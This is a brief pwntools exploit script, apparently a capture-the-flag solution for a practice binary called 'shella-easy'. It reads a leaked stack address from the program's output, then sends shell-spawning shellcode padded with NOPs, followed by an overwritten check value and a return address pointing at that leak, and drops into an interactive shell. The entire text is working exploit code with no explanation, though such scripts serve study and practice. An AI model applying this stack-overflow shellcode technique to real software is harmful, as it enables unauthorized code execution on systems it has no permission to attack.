from pwn import *
elf = context.binary = ELF("./shella-easy")
p = process()

p.recvuntil("ve a ")
STACK_LEAK = int(p.recvuntil(" ").decode()[2:],16)
p.recvline()


payload = asm(shellcraft.sh())
payload = payload.ljust(64,asm(shellcraft.nop()))
payload += flat(0xdeadbeef,b"A" * 8,STACK_LEAK)
# gdb.attach(p)

p.sendline(payload)
p.interactive()